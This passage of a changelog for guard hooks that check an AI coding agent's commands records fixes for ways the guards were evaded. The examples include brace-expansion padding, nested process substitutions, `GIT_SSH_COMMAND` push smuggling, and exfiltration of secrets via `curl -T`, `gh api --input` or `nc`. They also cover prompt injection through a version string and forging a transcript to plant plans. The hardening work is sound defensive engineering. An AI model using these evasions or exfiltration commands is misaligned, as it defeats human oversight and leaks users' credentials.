- **`prevent-secret-push` no longer treats a git builtin as a possible push alias.** git runs a builtin before any alias or `git-<name>` executable, so `git credential`, `credential-cache`, `credential-store`, `hook` (bare or `list`), `maintenance` and `merge-tree` are now allowed when the command sets `HOME=` or a `GIT_CONFIG*`/`GIT_DIR`/`XDG_CONFIG_HOME` variable, or runs in a directory the guard cannot resolve. The static list now holds every builtin shared by git 2.30 through current `master`, and a newer builtin is confirmed once per run with `git --list-cmds=builtins`. That check is used only for a plain `git` call in a command that does not set or name the `PATH` variable, since a `/path/to/git` call or a changed `PATH` may run a different git. `for-each-repo` runs the git command its arguments name, so it is still probed and still fails closed when the probe is blind. The same applies to `git hook` with any argument other than `list`, because `hook run` runs whatever hook the config names. `HOME=/tmp/x git hook run …` therefore still blocks, as it did before, while bare `git hook` and `git hook list` are allowed. Builtin here means not an alias; it does not mean the command cannot publish. The match is now case-sensitive, as git's is. Before, `git STATUS` and an alias whose value is `STATUS` were skipped as the builtin `status`, but git runs them through `alias.status`, which can push; they are now probed. `submodule` and `bisect` (on gits where it is still a script) are checked for a real `alias.submodule`/`alias.bisect` when the directory resolves, and are allowed when none exists. When the probe is blind, they stay allowed unless the command writes out `GIT_EXEC_PATH` or `--exec-path`. The command text is read once per command, so a long run of `git submodule` calls stays linear. An unknown subcommand still fails closed (`HOME=/tmp/x git mycustomalias` blocks). (cameronsjo/cadence-hooks#1284)
- **`prevent-secret-leaks` no longer blocks a glob like `*hooks*` or `*cadence*` as a secret read.** A glob was judged secret-shaped when its literal letters shared enough characters with a deny-set stem anywhere (`ks` of `hooks` with `jks`, `den` of `cadence` with `credentials`) and, separately, could match a deny-set name, which its `*` alone could spell (`hooks.jks`). The glob's own letters now have to line up with the family's name in a name both match: on the stem, or, once one letter is on the stem, on the family's fixed opening and closing letters (the whole of an exact name such as `.env.local`, `.zshrc.local` or `credentials.json`; a leading `.` counts only where the stem starts with it). The old count still blocks where a glob letter sits on some stem in a shared name (`app.?1?`) or the glob matches a deny-set name spelled without its own words (`.zshenv*`). `*hooks*`, `*cadence-hooks*`, `'cadence*'` and `find … -path '*hooks*' | xargs grep` pass as `*foo*` always did; `*.env*`, `.e*`, `.e*.local`, `.e[n][v].local`, `.e*duction`, `*id_rsa*`, `*credentials*`, `*.k?y` and `*env` still block, and `.git-c*`, `.zshrc.l*` and `*s.?son` now block. What passes that blocked before is a glob that reaches a secret only through a name spelled from its own words (`*hooks*`→`hooks.jks`, `*server*`→`server.key`, `tls-*pem*`). Glob judgment now has a per-command walk budget; a command that exhausts it blocks instead of running out the hook deadline, which fails open (cameronsjo/cadence-hooks#1285)
- **`prevent-secret-leaks` reads a `gh api` endpoint as a URL path, not a local file, and judges the files `gh api` sends.** `gh api "repos/o/r/contents/format.c?ref=$ref"` blocked because `$ref` was read as `*` and the stray `f`/`r`/`a`/`t` letters of `format.c?ref=` counted toward the `pfx` and `private` stems (fixed by the alignment above too). The endpoint positional of a plain `gh api` (byte-exact `gh` head, `api` as the first word, every flag known to gh's `api` command) is now judged like a pattern word: its glob reading is skipped, a literal secret name there still blocks with or without a `?query` (`repos/o/r/contents/.env?ref=main` prints that file), and a substitution in it is still judged. An unknown flag, a `--`, a second positional, an unquoted glob, or a wrapper such as `sudo` keeps the full scan. `--input FILE` and `-F`/`--field key=@FILE` values are now judged as files in every spelling pflag accepts (`-F=k=@f`, `-iF=k=@f`, `-Fk=@f`, `--field=k=@f`), and behind a `VAR=value` prefix (`GH_HOST=x gh api …`), so `gh api … -F body=@prod.env` and `--input prod.env` block where they passed; `-f`/`--raw-field`, which never reads a file, and `@-` (stdin) do not (cameronsjo/cadence-hooks#1276)
- **Local-override shell and git config files are secret files.** `.zshrc.local`, `.zshenv.local`, `.zprofile.local`, `.bashrc.local`, `.bash_profile.local`, `.profile.local` and `.gitconfig.local` join the shared deny-set, so a `Read` or a Bash read (`cat`, `grep`, `xargs grep`) of one blocks, as do `.*local` and the `.z*`/`.b*` dotfile sweeps; `prevent-secret-writes` now refuses writes and edits to them, as it does for `.npmrc`. The tracked `.zshrc`, `.bashrc`, `.gitconfig` and `.profile`, and `.vimrc.local`, stay open. `.local` is the distinctive stem, so `.zshrc.l*`, `.gitconfig.lo*` and `.*.local` block while `.zshrc*` and `.bash*` stay clean, like `.git*` past `.git-credentials`; `source ~/.zshrc.local` now blocks too (cameronsjo/cadence-hooks#1288)
- **The plan guards close the minor findings from the #791 review.** At approval, `persist-plan-approval` now writes `status: in-flight`, today's `updated`, and the current `branch` even when the plan's own frontmatter sets them, dropping the plan's lines for those keys and keeping its other keys verbatim. A plan that says `status: blocked` stays blocked, and on a detached HEAD the plan's own `branch:` is kept. `lint-plan-shape` no longer accepts a `Panel:` line hidden in an HTML comment block (one that starts its line, as CommonMark renders it; a mid-line `<!--` is plain text) or in the leading YAML frontmatter (a line-1 `---` rule is not frontmatter), and ignores surrounding punctuation before the trivial-reason check, so `Panel: none — n/a.` blocks. When it allows because there is no plan to judge (no plan text, or a `planFilePath` outside the plan store or unreadable inside it), it records an `unjudged` row in `failopen.jsonl`. The persist idempotency read, `warn-plan-ready-flip`'s checkbox count, and the plan branch of `rules validate-frontmatter` open with `O_NOFOLLOW | O_NONBLOCK` and require a capped regular file, so a planted FIFO no longer stalls them. `nudge-plan-tick` reads `git log` with `core.quotePath=false`, so a plan with a non-ASCII name is matched and no longer draws a false "untouched" nudge. `session plans` prints at most 50 entries, blocked plans first, followed by an `… N more not shown` line. A remote-less repo still counts as owned; that is now documented as deliberate. (cameronsjo/cadence-hooks#1256)
- **A `cd`, `git -C`, `--git-dir` or `--work-tree` target the same command bound to a literal now reads as that literal in every guard.** `M=/abs/repo; (cd "$M" && …); git -C "$M" commit …` was refused by `enforce-worktree` ("`cd $M` could not be resolved"), and `W=/abs; git -C "$W" merge-tree …` by `prevent-secret-push`, though each names its directory. `core` now rewrites such a read at the dispatch seam when the rewrite is an identity under bash: an earlier statement of the same group that is only `NAME=literal` words (optionally `export`ed), opening its list or `&&`-chained after another such statement, outside every `if`/loop body; every mention of the name in the command assigning that same plain value; and nothing in the command that can assign a computed name (`eval`, `source`, `read`, `declare`/`local`, `printf -v`, `unset`, arithmetic, `${…}` operators, `$'…'`, backticks, a command word built from an expansion). A substitution, a prefix assignment (`M=x cmd`), a pipeline or backgrounded assignment, a conditional one, one inside a subshell read outside it, and a value with a blank, quote, glob or tilde all keep refusing (cameronsjo/cadence-hooks#1287).
- **`prevent-secret-leaks` judges the command behind leading assignments and redirections, and a secret redirected into a program that uploads its stdin.** `FOO=1 cat prod.env`, `FOO=1 curl -T prod.env x`, `< prod.env cat`, and `gh api r --input - < prod.env` were allowed: the assignment or operator was read as the head, so no reader was recognized, and a redirect source was judged as an unqualified word. The reader behind any run of `NAME=value` words and redirections is now judged, and an input redirection from a secret file blocks when the command sends its stdin out (`curl -T -`/`-d @-`, `gh api --input -`, `gh gist create`, `nc`, `ssh`, `http`, `kubectl apply -f -`, `aws s3 cp -`, and kin). An inert prefix keeps a metadata-only exemption (`FOO=1 ls .env` is allowed, like `ls .env`), while one that can change what runs or what is read (`LD_PRELOAD`, `DYLD_*`, `PATH`, `IFS`, `BASH_ENV`, `ENV`, `HOME`, `XDG_*`, `GIT_*`, `GH_*`, `PAGER`, `EDITOR`, and kin) voids it, so `LD_PRELOAD=x ls .env` blocks, and `env LD_PRELOAD=x ls .env`, which was allowed, now blocks too. (cameronsjo/cadence-hooks#1296)
- **`warn-untracked`, `verify-pr-autoclose`, `inject-gh-write-context`, `guard-body-budget` and `redact-external-content` now judge the repo a command runs in, not the session's cwd repo, so a meta-repo session is judged against the nested repo it works in.** A new `cadence_hooks_core::target_repo::command_repo_dir` resolves the payload cwd after a leading `cd` chain to the innermost repo, and `warn-branch-base` now shares it. It follows only a chain of plain `cd`s at the start of the command, joined by `&&` or `;`. It names only the session's repo or a repo nested inside its tree, such as the gitignored nested repo of a meta-repo. `cd <nested> && git commit` lists the nested repo's untracked files instead of the meta-repo's. The listing comes from `git ls-files --others` with `core.fsmonitor` and the untracked cache switched off, so no repo-configured program runs. The status-based reminder about an unstaged plan still runs only in the session's own checkout. The list shows at most 20 sanitized names. `cd <nested> && gh pr create`/`gh pr merge` reads the nested repo's origin; and a `-R`-targeted `gh` post's bare `#N` is compared against the nested repo's origin. Any other `cd` leaves these advisories quiet rather than judging the wrong repo: a conditional one (`false && cd x`, `cd x || exit`), one outside the session's tree, or one into a directory that does not exist. A `cd` out to an enclosing repo now also leaves `warn-branch-base` quiet. `guard-body-budget` and `redact-external-content` now read the per-repo `.claude/cadence.json` of the repo such a `cd` moves into as the primary config, and read the session repo's config as well. Where the two configs reach the same verdict, that verdict stands. Where they disagree, the guard nudges instead, naming each repo and what its config says, so the model judges which applies; a `guard-body-budget` block that only one repo's config produces becomes that nudge. That nudge words the block as a would-block. It keeps any bypass provenance either side carried, and writes a `config_disagreement` ledger row for the downgraded block. Neither repo's findings are dropped: when the configs agree, the session repo's budget message and redaction hits are kept alongside the nested repo's. An `additionalPatterns` replacement and config warnings now reach the model as one sanitized line, whichever repo they come from. Credential and identity blocks in `redact-external-content` do not depend on config, so they still block. These guards resolve the repo from files only and run no `git` in the `cd` target. (cameronsjo/cadence-hooks#225)

### Security

- **`SECURITY.md`'s offline verification recipe is pinned tighter and names the cosign version it needs.** The `cosign verify-blob` identity pattern is now anchored (`^…release\.yml@refs/tags/vN.N.N$`), and the note offering a repository-only pattern is replaced by a warning. A signature from any workflow on any branch of this repo satisfies the repository-only pattern, which a dry run confirmed. The recipe now requires cosign v2.5.0 or later, because releases signed by cosign-installer v4 (cosign v3) use the newer bundle format, which v2.4.x and earlier reject.
- **Secret values in Bash output are now masked before they reach the model and the transcript.** The new `cadence redact-secret-output` (PostToolUse, Bash) returns `updatedToolOutput` with the full Bash output object. It masks credential tokens (the shared `credential_scan` grammar, boundary gate relaxed, plus JWTs, Google `ya29.` and Heroku `HRKU-` tokens), private keys from any `BEGIN … PRIVATE KEY` to the next `END` or end of stream (a key split across stdout and stderr included), URL passwords (`scheme://user:pass@`), and any value whose *name* is secret-shaped, in env, YAML, JSON (double- or single-quoted keys, Python reprs, Ruby hashes), `docker inspect`, k8s/ECS `name`/`value` pairs, long and command-aware short flags (`mysql -pV`, `curl -u u:V`, `docker login -p V`, `sshpass -p`, `redis-cli -a`), header, table and `.netrc` forms, after stripping ANSI colour codes and decoding JSON string escapes around each backslash. A strong name (`password`, `secret`, `token`, `api_key`, `Authorization`, glued forms like `PGPASSWORD`/`GITHUBTOKEN`, and `requirepass`/`pass`/`pw`, …) masks any value except booleans, placeholders and `$VAR` references; a strong name with a metadata suffix (`SECRET_TOKEN_URL`) masks unless the value looks like a URL, path, number or reference; a weak one (`…_key`, `auth`) needs a credential-shaped value in prose-shaped forms, so test-runner, build, git and error output stays unmasked. It emits nothing when nothing was masked, stays linear (every 5 MB adversarial shape measured at 0.37 s CPU or less, release build), and on PostToolUse a rewrite survives a sibling block (exit 0, the block reason in `additionalContext`). `CADENCE_ALLOW_SECRET_OUTPUT` passes raw output through and records a bypass. The companion `cadence guard-secret-dump` (PreToolUse, Ask-only) prompts before a bare-value producer, including one inside `$(…)`, backticks, `<(…)`, `sh -c` or `eval` whatever consumes it (`security … -w`, `kubectl get secret -o jsonpath|template|custom-columns` or `-o json|yaml | jq`, `op read`, `vault … -field`, `aws secretsmanager get-secret-value`/`ecr get-login-password`/`ssm get-parameter --with-decryption`/`configure get <secret>`, `gcloud secrets versions access`/`auth print-access-token`, `az keyvault secret show`/`account get-access-token`, `heroku auth:token`, `pass [show]`, `gopass show`, `bw get password`, `lpass show --password`, `doppler secrets get --plain`) prints, unless the pipeline's last stage is a hash (`shasum`/`sha*sum`/`md5sum`/`b2sum`/`cksum`) or stdout goes to a real file (`tee` and `/dev/stdout`-style paths count as printing). There is no stdin-consumer exemption: `docker login --password-stdin <<< "$(op read …)"` asks too. The shared token grammar also gains GitLab `glpat-` and npm `npm_` tokens (random-looking bodies only, so documentation placeholders pass), which tightens `prevent-secret-push` and `redact-external-content`. Both hooks need the cadence plugin's hooks.json wiring before they fire. OpenTelemetry/analytics still see the raw output, output read back through `BashOutput`/`Monitor`/`Read` is not covered, and a hook failure or timeout leaves the raw output in place (cameronsjo/cadence-hooks#776).
- **`platform-drift` no longer echoes text that rides after a baseline version number.** The version parser now accepts only `MAJOR.MINOR.PATCH` with an optional `-[0-9A-Za-z.]{1,32}` pre-release tag, over the whole string. Any other value, such as `9.9.9 IGNORE PREVIOUS INSTRUCTIONS`, counts as malformed, so the SessionStart nudge stays silent instead of carrying the extra text into `additionalContext`. (cameronsjo/cadence-hooks#1250)
- **Every guard now sees the commands inside a process substitution.** `core` surfaces the body of an unquoted `<(…)` or `>(…)` as a command of its own, as it does a `$(…)` body, wherever bash opens one: at a word's start, glued into a word (`a<(…)`, `$<(…)`, `2>(…)`), in an unquoted `${v:-<(…)}` default, as an assignment value, and nested or inside a substitution bash re-parses. Writers, deletes, dangerous git verbs and pushes there (`true <(mv d .env)`, `cat >(git reset --hard)`, `cat <(rm note.md)`, `diff <(git push origin main) x`) now reach `prevent-secret-writes`, `git-safety`, `trash-guard`, `guard-runbook-scrub`, `prevent-secret-push` and `guard-push-remote`; the push walk judges such a push in the directory in effect where the substitution is written, and a `cd` inside it does not move the parent. A process substitution spends no expansion level, so a literal `$(…)` inside one is still evaluated where it was before (`cat <(echo $(echo $(echo $(git $(echo reset) --hard))))`), including one the segment splitter cut open at a separator inside it (`cat <(cat <(cat <(echo $(git $(echo reset) --hard; true))))`). Inside double or single quotes and in heredoc text the construct stays literal, and an unterminated one keeps the rest of the line visible. A `cd` that opens a `$(…)`/`<(…)` the segment splitter cut at a separator (`echo $(cd /x && git push origin main )`) now makes the pushes inside it unverified instead of judging them in the parent's directory, so fail-closed push guards refuse them (cameronsjo/cadence-hooks#1233).
- **A command nested past the expansion depth now reaches every guard.** Past the three levels `core` expands, every remaining `$(…)`, `<(…)`, `>(…)` and backtick body is now listed as written, one segment per level with its own nested substitutions collapsed to their opener, so `echo $(echo $(echo $(echo $(git reset --hard))))` and deeper mixes are judged like a shallow one; the listing is linear in the input and charged to the expansion allowance. A wrapper script there (`bash -c`, `eval`, and every other runner already read) is unwrapped the same way. A push nested past the push walk's depth reads as one it cannot place, so fail-closed push guards refuse it. Past that depth a body is listed, not evaluated: a substitution, variable or glob inside it is not resolved, so `git $(echo) reset --hard` nested four deep is still not read as `git reset --hard`. `enforce-worktree`, which walks its own three levels, refuses a script nested past them that names a commit (quote-blind, or once braces and `$'…'` are read), judged from every directory: a process substitution counted as a level, so `cat <(echo $(echo $(echo $(git commit -m x))))` committed in a primary checkout (cameronsjo/cadence-hooks#1267).
- **`persist-plan-approval` keeps control characters out of its nudge's persisted path.** `CADENCE_PLANS_DIR` components are now limited to `[A-Za-z0-9._-]`; any other value falls back to the user-scoped plans directory, as an escaping one already did, and creates nothing. A hand-saved plan whose file name falls outside that charset is no longer adopted, and the hook writes its own copy instead. The rendered path passes `sanitize_field` too, so a newline in the checkout root cannot break the line. A repo's committed settings could previously put multi-line instructions into `additionalContext` (cameronsjo/cadence-hooks#1254).
- **`persist-plan-approval`'s approve-and-clear arm persists only a plan the parent session actually proposed.** The transcript pointer in the child's first message must be an absolute path inside `<config_dir>/projects`, opened without following symlinks below that root. Its stem must be a UUID other than the child's own session id. The file must record a main-chain `ExitPlanMode` call whose plan is this exact body (the last 64 MiB is read, line by line). A plan edited in the approval dialog (Ctrl+G) is matched against the plan-store file named by that call's `planFilePath` instead, when that file is inside `<config_dir>/plans` and read through the same contained open. The pointer is now also found after an approve-with-feedback paragraph and in a config path containing a space. A prompt ending in a pointer to a repo-committed or other arbitrary `.jsonl` could previously forge `approved_session_id` and plant a plan the hook told Claude to commit (cameronsjo/cadence-hooks#1255).
- **Every fail-closed guard refuses a command part of which it could not read.** Once the call's or thread's brace-expansion budget is spent, every later word bash brace-expands is left whole, so the command is marked unread and `git-safety`, `prevent-secret-writes`, `trash-guard`, `guard-runbook-scrub`, `prevent-secret-push`, `guard-push-remote` and `prevent-secret-leaks` refuse it ("command too large to read in full") instead of judging the words left whole. Padding a command with brace expansions until the budget ran out (16 `: {1..1024}{1..4}` words on main, half that through a wrapper whose script reads two ways) left a later `{git,reset,--hard}` or `{cp,d,.env}` unexpanded, and it ran past every guard. A single word past its own bound (more than 4,096 words or 64 groups) spends nothing past the work it did, so the words after it are still read, and it refuses the command only where it can hide what runs: in command position, under a command word that is not a fixed literal, in a wrapper's script (`bash -c`, `eval`, `xargs`, `find -exec`), in a heredoc body a shell runs, or among operands a guard judges. Alone in the arguments of `echo`, `printf`, `:` or a `for … in` list — or of `touch`/`mkdir`, except to `prevent-secret-writes` and `guard-runbook-scrub`, which judge the paths those create (`touch .{a..z}{a..z}{a..z}` creates `.env`) — with its output not piped past a data sink, or in a heredoc body no shell runs, it passes: `for i in {1..5000}`, `printf '%s\n' {a..z}{a..z}{a..z} | wc -l` and minified JSON in `cat > x.json <<'EOF'` are not refused (`prevent-secret-leaks` keeps its own refusal of any over-bound word outside a heredoc body). A bypass a guard honours still stands, and a command whose expansions fit the budget (`mkdir -p src/{a,b,c}`, `for i in {1..4096}`) is read as before (cameronsjo/cadence-hooks#1279).
- **A push nested three or more shells deep with escaped quotes now reaches every guard, and a git setting that runs a command is read as the script it runs.** `core` decides quote removal once, in the tokenizer: a wrapper's script (`bash -c`, `eval`, `trap`, a git exec value, …) is now read from words whose backslashes `'…'` made literal are kept, so `bash -c 'bash -c "bash -c \"git push origin main\""'` and the `'\''` and `git rebase -x` spellings of it are read to the push instead of `bash -c git`; four levels reach the wrapper depth and are refused as a push that cannot be resolved. The reading before is kept beside the new one, so a script it surfaced is still judged (`eval 'echo \$(cat .env)'` still lists a `cat .env` bash does not run); a script only one reading finds is walked in that reading alone, the second spelling is read only where a backslash sits inside quotes and costs the brace-expansion budget nothing, past a 1 MiB allowance of its own the command reads as unread (refused, see cameronsjo/cadence-hooks#1279 below), each exec value counts once against the 16-script cap, and `warn-stacked-base-delete` counts each deleted branch once. A git invocation that sets on its command line a value git runs as a command — `-c`/`--config-env` with `core.sshCommand`, `core.pager`/`pager.*`, `core.fsmonitor`, `core.hooksPath`, `core.askPass`, `core.gitProxy`, `diff.external`, a diff `textconv`, a merge `driver`, a filter `clean`/`smudge`/`process`, `uploadpack.packObjectsHook`, a remote's `uploadpack`/`receivepack`/`vcs`, `interactive.diffFilter`, a `protocol.*allow` that is not `never`, a key that is an expansion (`-c "$K=x"`), or any key ending in `command`, `program`, `helper` or `cmd`, or a `GIT_SSH_COMMAND`/`GIT_SSH`/`GIT_PAGER`/`PAGER`/`GIT_EXTERNAL_DIFF`/`GIT_ASKPASS`/`SSH_ASKPASS`/`GIT_PROXY_COMMAND` assignment in front of git, `-c` spelled as the environment (`GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>`/`GIT_CONFIG_VALUE_<n>`, `GIT_CONFIG_PARAMETERS`) or a `GIT_ALLOW_PROTOCOL` naming `ext`; a `NAME+=value` prefix counts like `NAME=value`, here and for every guard that peels assignments — is read as a script nested in that git invocation when its value is fully literal (no expansion or substitution, every quote closed; `$HOME`, `${HOME}` and `~` count as literal while nothing in the command can rebind `HOME` past one unquoted path), so `git -c core.pager="less -R" log`, `GIT_PAGER=less git log` and `GIT_SSH_COMMAND="ssh -i $HOME/.ssh/k" git fetch` pass while `GIT_SSH_COMMAND="sh -c 'git push evil main'" git fetch` is judged as that push, and a literal `core.hooksPath` directory is not read (hooks on disk are outside every guard's reading, as the ones `git commit` runs anyway are); any other expansion (`"ssh -i $USER/k"`, a `HOME` set in quotes, `unset`, `read` or after `eval`/`source`), a non-literal `core.hooksPath`, a `--config-env` value, an allowed protocol, an expanded key and the environment spellings of `-c` still read as a push that cannot be resolved, whatever the subcommand; past the wrapper depth any such setting, a `GIT_*` assignment or a `-c`/`--config-env` on git reads the same, matched with quotes and backslashes dropped (`ssh"C"ommand`, `gi""t`), so `prevent-secret-push` and `guard-push-remote` refuse it (`GIT_SSH_COMMAND='ssh -i key' git push` nested that deep included); there the value is not parsed. An empty value, a pager of `cat` or a boolean, a boolean `core.fsmonitor` and `core.hooksPath=/dev/null` are not counted; editors stay read as scripts. A nested `sh -c "$X"`/`eval "$X"` is still read as at the top level, which does not refuse it, and settings in config files (`include.path` included) or the exported environment are still not read (cameronsjo/cadence-hooks#1231).
- **`guard-forge-write` now judges a `tea`/`glab` write behind a command runner.** It peeled only the transparent prefixes (`command`, `nohup`, `env`), so `timeout 5 tea pr create --repo other/r`, `nice -n 5 …`, `stdbuf -o0 …`, `xargs …`, `sudo -u me …` and `setsid …` ran a write to a repo you don't own with no check. It now uses the shared `peel_command_runners` the other guards use, and a runner option that peel cannot parse no longer hides the write: the first `tea`/`glab` word among the runner's own options, operands and numbers behind it is judged (a `tea` in the arguments of the command it runs, as in `timeout --x 5 echo tea pr create …`, is not). A write to an owned repo behind a runner still passes, and a read stays a read. `guard-gh-write` already peeled runners and is unchanged (cameronsjo/cadence-hooks#1262)
- **`obsidian-trash-guard` judges a relative deletion in the directory a plain `cd`/`pushd` earlier in the same command puts it.** It judged every relative deletion in the session cwd, so `cd "$OBSIDIAN_VAULT" && rm x.md`, `cd ~/vault; rm -f notes/*.md`, `(cd ../vault && rm x.md)` and `echo $(cd "$OBSIDIAN_VAULT"; rm x.md)` deleted vault notes unchecked. Each segment the existing directory walk (`segment_work_dirs`, with `$OBSIDIAN_VAULT` and `$HOME` read as the values the guard holds) places in exactly one other directory now has its relative operands judged there, and no longer in the session cwd when that directory exists at hook time and the command has no `||` (a `cd` that fails, as into a mistyped directory, leaves `cd /nonexistent; rm -f x.md` deleting in the cwd, so that still blocks), at the top level, inside `( … )`, and inside `$( … )`, backtick and `<( … )` bodies, each body placed as a script of its own so its `cd` moves nothing after it (`x=$(cd "$OBSIDIAN_VAULT" && git log -1); rm -rf build` and `(cd vault && ls); rm -f out.txt` still pass). A deletion after a move the walk cannot place (`cd "$D"`, `cd -`, `popd`, a `cd` inside `if`), inside a wrapper script (`bash -c 'cd …; rm …'`), or in a command over 16 KiB keeps the verdict it had. Judging a placed deletion only where it lands also lifts false blocks: from `$HOME` (an ancestor of the vault) `cd /tmp && rm -rf ./*` and `cd build && find . -name '*.o' -delete` now pass, and from inside the vault `cd /tmp && rm -rf build` passes when every deletion is a plain verb the walk placed outside the vault and every other segment is a directory move or inert (`git rm`, `xargs`, `find`, a glob or a `..` operand, and a deletion left in the vault cwd still block). A deletion operand that reads `$OBSIDIAN_VAULT` or `$HOME` is now also read as the value the guard holds, so `rm -rf "$OBSIDIAN_VAULT"` and `cd proj && rm -rf "$OBSIDIAN_VAULT"` block. This is part 2 of the issue only; part 1, backslash escapes inside backticks, is out of scope (cameronsjo/cadence-hooks#1271)

## [0.122.0] - 2026-10-03

### Added

- **The plan-shape lint nudges on a plan with no `## Loop` section.** `lint-plan-shape` and the persist-time format gate now name `a ## Loop section` among the stanzas a plan lacks, between the `Panel:` line and the Alternatives-declined stanza. It is a nudge only: the `Panel:` line is still the one stanza that blocks. The check looks for the heading and nothing under it, so a table or `Loop: none — <reason>` under the heading both pass, and that line with no heading above it does not. The heading match is the exact line `## Loop` with optional trailing whitespace, so `## Loopback`, `### Loop`, `## loop`, an indented heading, and a `## Loop` line inside a single fenced code block do not count. (tracked in cameronsjo/cadence-hooks#1281)

## [0.121.0] - 2026-09-30

### Security

- **Every push guard now sees a `git push` that another git command runs through its own exec argument.** `core` re-reads as commands the value of `git rebase -x`/`--exec` (any abbreviation or short cluster git accepts, repeatable, and past a `--` that is another option's value, as in `-X -- -x CMD`), an editor named by a `GIT_SEQUENCE_EDITOR`/`GIT_EDITOR`/`VISUAL`/`EDITOR` assignment in front of a git command that can start an editor (`commit`, `merge`, `tag`, `rebase`, `pull`, `revert`, `cherry-pick`, `notes`, `am`, `send-email`, `config -e`, `branch --edit-description`, `add -e/-p/-i`, `checkout`/`restore`/`reset`/`stash -p`, `config edit`, `replace --edit`, or an alias or subcommand not known never to start one) or a `-c sequence.editor=`/`-c core.editor=` global on one, the tail of `git bisect run`, the command of `git submodule foreach` (and `submodule--helper foreach`, whose `--quiet`/`--recursive` may follow the command), whose first word is shell text and the rest its arguments (a `"$@"`/`$1` in that text reads them, and a push walk reads such a command as a push that cannot be resolved, since the substitution cannot follow `shift`, `set --`, quoting or a function's own arguments), each `git filter-branch` `--setup`/`--*-filter` value, `git difftool -x`/`--extcmd`, and the `--upload-pack` of `fetch`/`ls-remote`/`pull`/`clone`/`fetch-pack` (and `clone -u`, `ls-remote`/`fetch-pack --exec`), `--receive-pack`/`--exec` of `push`/`send-pack` and `--exec` of `archive`. A chain of `bisect run`/`submodule foreach` words is read through to its end at any length. `prevent-secret-push`, `guard-push-remote`, `warn-stacked-base-delete` and `nudge-upgrade-after-push` judge the nested push, every other guard sees the nested command, and one nested past the wrapper depth is still listed as written. A rebase, bisect, difftool or editor command runs at the top of the working tree, not the directory it was started in, so its push is judged there (asked of git when the guard may probe, else found from the nearest valid `.git` above the directory with symlinks resolved; a directory that is not there yet reads as one that cannot be verified). A push run in each submodule, under `filter-branch`'s exported `GIT_DIR`, by a transport's pack command, or under an exported `--git-dir`/`-c` global reads as one whose repository cannot be known. A nested git whose subcommand is a push alias the outer `-c alias.X=`/`--config-env=alias.X` exports, a nested command whose first word is an expansion (`-x "$CMD"`; an editor included, even `"$EDITOR"`: every way of telling the session's own editor from a value the same command binds had a way around it), more than 16 exec scripts, or git exec nesting past the wrapper depth reads as a push that cannot be resolved, so fail-closed guards refuse it; a nested `sh -c "$CMD"` or `eval "$CMD"` is read as it is at the top level, and editor, pager, ssh-command and hook settings in config files or the exported environment are not read (cameronsjo/cadence-hooks#1231). `guard-push-remote`'s own prefilter passes such a command when no `push` is spelled, but its plugin wiring (`if: Bash(*git push*)`) still starts it only on commands that spell `git push`, so in a live session the unfiltered `prevent-secret-push` is what refuses one that does not (the wiring follow-up is cameronsjo/cadence#1549). A `git submodule foreach` command that reads `$toplevel`/`$sm_path` or a positional parameter reads as unresolvable too, a deliberate over-block (cameronsjo/cadence-hooks#1226). This supersedes the 0.119.0 `prevent-secret-push` entry's "not scanned" note for a push nested in another git command's exec string.

### Fixed

- **`prevent-secret-push`'s `help.autocorrect` check no longer caches a failed command-list probe.** It asks git for `--list-cmds=builtins,main` (and searches `PATH` itself instead of `others`, whose PATH scan could overrun the 2 s probe on a loaded Windows host), and a probe that fails is asked again on the next call instead of leaving every builtin reading as unknown for the rest of the process (which refused `git hash-object` under an autocorrect config). A `git-<name>` on `PATH` counts only when it is an executable file in an absolute directory, as git itself requires, so a planted non-executable `git-psuh` or a relative `PATH` entry no longer passes a `git psuh` git would autocorrect to `push`.
- **`cadence record-scrub` judges the file it actually reads.** It opens the draft once, non-blocking, checks the opened handle is a regular file, and reads through the 16 MiB cap, so a path swapped for a FIFO or a larger file between a check and the read can neither stall it nor have other bytes hashed (cameronsjo/cadence-hooks#755 review follow-up).

## [0.120.0] - 2026-09-30

### Added

- **`guard-runbook-scrub` makes the runbook secret-scrub gate mechanical, and `cadence record-scrub --file <path>` records the scrub it checks for.** When `CADENCE_RUNBOOKS_DIR` is set, a new `guardrails` PreToolUse guard blocks a Write/Edit/MultiEdit into that directory unless the resulting document (the Write's content, or the on-disk file with every edit simulated strictly) hashes to a SHA-256 marker that `record-scrub` wrote into the private config-dir marker directory; the digest reads `\r\n` as `\n` on both sides. A resulting document that cannot be computed blocks: an unreadable file, an `old_string` that is empty or not found literally (Claude Code's Edit normalizes curly quotes, so it may apply what the simulation cannot), or an edit entry without an `old_string`/`new_string` pair (an MCP `edit_file`'s `oldText`/`newText`). Writes into that marker directory are refused to every tool the guard judges, so a marker is recorded only by `record-scrub` (a write target that is the marker directory's parent is refused too, unless it is the root or a temp dir; a grandparent is a documented miss) (active, like the rest of the guard, only while `CADENCE_RUNBOOKS_DIR` is set). A Bash write into the directory (a redirect, or a `tee`/`cp`/`mv`/`install`/`ln`/`rsync`/`dd`/`truncate`/`touch`/`rm`/`sed -i`/`perl -i`/`curl -o`/`wget` target, read by `prevent-secret-writes`' own parser, now shared as `segment_write_targets` and extended with `rsync`) blocks outright, since its content cannot be known before it runs; an MCP move into the directory blocks too, because its synthesized Write carries no content. An MCP copy, and MCP write verbs the tool-name classifier does not recognize (`append_file`, `save_file`, `str_replace`), are not classified as writes — a documented residual. Targets resolve lexically and physically (symlinks followed, `..` applied after them), ASCII-case-insensitively, with `~`, `$HOME` and `$CADENCE_RUNBOOKS_DIR` expanded (bare, braced, or defaulted with `:-`/`-`/`:=`/`=`), `$PWD`/`${PWD}`/`~+` read as each work dir, drive spellings (`C:\…`, Git Bash `/c/…`) normalized on Windows, globs matching any name, and relative targets judged in every directory a `cd` may leave the command in; a target whose location rests on a variable, substitution or `cd` the hook cannot read blocks only when the command names the directory. A command that names the directory (a path spelling on a path boundary — a short flag's attached value such as `-C/…` counts — read with `$HOME`/`${HOME}`/`~` expanded and `//`, `/./` collapsed; a `$CADENCE_RUNBOOKS_DIR` expansion; a segment running inside the directory; or one running in its parent with a word equal to the directory's name, `tar -C Runbooks`) may only read it: any other write, or any program outside a short read-only list (which catches `python -c`, `tar -x -C`, `git -C`, `mkdir`, `xargs cp`), blocks — `rg`, `fd`, `tree`, `sort` and `uniq` are listed only without the options that write or run a program (`sort -o`/`-T`, `tree -o`/`-R`, `fd -x`, `rg --pre`, a second `uniq` operand counting `-`; long options matched by any `getopt_long` prefix), `file -C` is refused likewise, and no listed program counts as a reader with a `NAME=value` assignment in front of it (locale, `TZ`, `TERM`, `COLUMNS`/`LINES` and `NO_COLOR` excepted) or with a 